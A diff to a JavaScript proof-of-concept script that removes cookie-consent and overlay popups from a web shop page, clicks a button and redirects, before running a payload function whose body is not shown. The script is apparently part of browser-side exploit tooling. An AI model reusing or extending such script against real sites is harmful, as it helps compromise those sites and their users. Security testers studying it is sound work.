@@ -86,9 +86,7 @@ function execPayld() {
     document.getElementById('okbutton').click();
     event.preventDefault();
   });
-  setTimeout(() => {
-    window.location.href = window.location.href.split('#')[0] + '#products';
-  }, 50);
+  window.location.href = window.location.href.split('#')[0] + '#products';
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
@@ -100,8 +98,9 @@ function checkDOM() {
   if (popupElements2[0].getAttribute('aria-label') == 'cookieconsent') {
     console.log('[*] Removing popup DOM element #2 (cookie consent)');
     popupElements2[0].remove();
+    cookieConsentElementDeleted = true;
   }
-  if ((popupElements1[0] != undefined) || (popupElements2[0].getAttribute('aria-label') == 'cookieconsent')) {
+  if ((popupElements1[0] != undefined) || (!cookieConsentElementDeleted)) {
     console.log('[*] DOM popups NOT deleted');
     setTimeout(() => { checkDOM(); }, 10);
   } else {
@@ -123,5 +122,6 @@ function startPoC() {
     execPayld();
   }
 }
+var cookieConsentElementDeleted = false;
 checkDOM();
 // EoF
